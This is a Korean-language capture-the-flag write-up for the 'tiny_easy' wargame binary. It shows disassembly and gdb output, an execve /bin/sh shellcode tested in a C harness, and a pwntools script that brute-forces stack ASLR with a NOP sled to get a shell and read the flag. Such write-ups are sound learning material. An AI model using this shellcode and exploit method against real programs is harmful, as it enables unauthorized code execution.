---
sort: 6
---

# tiny easy

뭐 objdump로도 안뜨고 그러길래 scp를 이용하여 tiny_easy 바이너리파일을 내려받아 binary ninja에 넣어보았다.

```
_start:
08048054  pop     eax {__return_addr}
08048055  pop     edx {arg1}
08048056  mov     edx, dword [edx]
08048058  call    edx
0804805a  ??
```

위 처럼 나왔다.<br>
gdb에 넣고 0x08048054에 breakpoint넣고 분석해보니, argv[0]의 첫 4byte를 가져와서 해당부분을 주소로써 호출한다.<br><br>

```
(gdb) info proc
process 179554
warning: target file /proc/179554/cmdline contained unexpected null characters
cmdline = '/home/tiny_easy/tiny_easy'
cwd = '/home/tiny_easy'
exe = '/home/tiny_easy/tiny_easy'

(gdb) shell cat /proc/179554/maps
08048000-08049000 r-xp 00000000 103:00 23593600                          /home/tiny_easy/tiny_easy
f7797000-f779a000 r--p 00000000 00:00 0                                  [vvar]
f779a000-f779b000 r-xp 00000000 00:00 0                                  [vdso]
ffd26000-ffd47000 rwxp 00000000 00:00 0                                  [stack]
```

memory부분을 살펴보니 stack에 쓰기권한과 실행권한이 동시에 존재하는 것을 확인할 수 있다.<br>
따라서 shellcode를 stack에 넣고 동작시키기로 했다.<br>
shellcode가 정상적으로 동작하는지 확인하기 위해 아래와 같은 test 프로그램을 만들었다.<br>

```c
// test.c

#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

#define BASE ((void*)0x5555e000)


int main(int argc, char** argv)
{
        void (*fp)(void);
        void* base = NULL;
        int len = strlen(argv[1]);
        if ((base = mmap(BASE, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)) != BASE){
                printf("mmap error\n");
                return 1;
        }

        strcpy(base, argv[1]);
        fp = base;
        fp();

        return 0;
}
```

tiny_easy가 32bit 프로그램이기 때문에 test 프로그램도 `-m32` 옵션을 이용해 32bit로 빌드하고 확인하는 모습이다.<br>

```bash
tiny_easy@pwnable:/tmp/dlfjs$ gcc -o test test.c -m32
tiny_easy@pwnable:/tmp/dlfjs$ ./test `python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80')"`
$
```

shellcode가 정상적으로 동작하는 모습이다. 그런데 stack aslr이 걸려있기 때문에 nop sled를 사용한 뒤 될 때까지 실행했다.<br>

```python
from pwn import *

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

nop_sled = '\x90'*0x10000
target_addr = p32(0xffd46d0c)

ARGV = []
ARGV.append(target_addr)
ARGV.append(nop_sled + shellcode)

def func():
    p = process(executable='/home/tiny_easy/tiny_easy', argv=ARGV)
    p.sendline('cat /home/tiny_easy/flag')
    try:
        print(p.recvline())
    except EOFError:
        return True
    p.interactive()
    return False

while True:
    if func():
        continue
    break
```

```tip
## 알게 된 점

nop sled
```